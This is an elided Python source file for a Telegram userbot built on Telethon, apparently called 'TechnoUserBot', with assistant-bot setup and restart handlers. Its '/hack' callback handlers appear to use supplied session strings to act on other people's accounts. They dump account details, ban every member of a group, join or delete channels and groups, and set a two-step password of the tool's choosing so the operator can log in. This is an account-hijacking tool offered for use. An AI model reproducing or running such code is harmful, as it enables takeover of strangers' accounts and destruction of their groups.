...
technoboy = 2024465080


from telethon import Button, custom, events

from .helpers.core.logger import logging
from .helpers.core.session import techno, tgbot

LOGS = logging.getLogger("TechnoUserBot")
TECHNO_PIC = "https://telegra.ph/file/6827fe35330c99e5a67c0.jpg"
...
async def killer():
    TECHNO_USER = bot.me.first_name
    Technoboy_02 = bot.uid
    tech_mention = f"[{TECHNO_USER}](tg://user?id={Technoboy_02})"
    name = f"{tech_mention}'s Assistant"
    description = f"I am Assistant Of {tech_mention}.This Bot Can Help U To Chat With My Master  @Technot_Official"
    starkbot = await techno.tgbot.get_me()
    ...
    if bot_name.endswith("Assistant"):
        ...
        try:
            ...
            await asyncio.sleep(1)
            await bot.send_file(
                "@BotFather", "Technot/helpers/resources/pics/main.jpg"
            )
...
@techno.tgbot.on(events.NewMessage(pattern="/start", func=lambda x: x.is_group))
...
@techno.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
async def help(event):
    ...
    if event.query.user_id is not bot.uid:
        ...
        await tgbot.send_message(
            event.chat_id,
            message=f"Hey, I am your {bot_id}'s assistant bot.\nI Am Here To Help U \n\nPowered By [Technot](https://t.me/Technot_Support)",
            buttons=[
                [
                    Button.url(" Support ", "https://t.me/Technot_Support"),
                    Button.url(" Updates ", "https://t.me/Technot_Updates"),
                ],
                [
...
async def rel(event):
    if event.query.user_id == bot.uid:
        await event.answer("ShutDown †ê¢hñðßð†...", cache_time=0, alert=True)
        if BOTLOG:
...
@techno.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"res_tart")))
async def res_ttart(event):
    if event.query.user_id == bot.uid:
        await event.answer("Restarting Please Wait 4 min... ", cache_time=0, alert=True)
        if BOTLOG:
            TECHNO = await event.client.send_message(
                BOTLOG_CHATID, "# RESTART \n" "Bot Restarted"
            )
        try:
            await techno.disconnect()
...
@techno.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"setvar")))
...
@techno.tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ahack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        if len(i) > 3855:
            ...
            file.write(i + "\n\nDetails BY TechnoBoy")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(
                i + "\n\nThanks For using TechnoBoyBot. \n/hack", buttons=keyboard
            )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            i + "\n\nThanks For using TechnoBoy Bot.\n/hack", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Banning all members. Thanks For using TechnoBoy Bot", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(i + "\n\nThanks For using TechnoBoy Bot", buttons=keyboard)
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Joined the Channel/Group Thanks For using TechnoBoy Bot", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        await event.reply(
            "Deleted the Channel/Group Thanks For using TechnoBoyBot.", buttons=keyboard
        )
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `TechnoBoy Bot Is best` you can login now\n\nThanks For using TechnoBoy Bot.",
                buttons=keyboard,
            )
        else:
...
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        ...
        try:
            ...
            await event.respond(
                "SEND THIS ERROR TO - @Techno_Userbot\n**LOGS**\n" + str(e)
            )
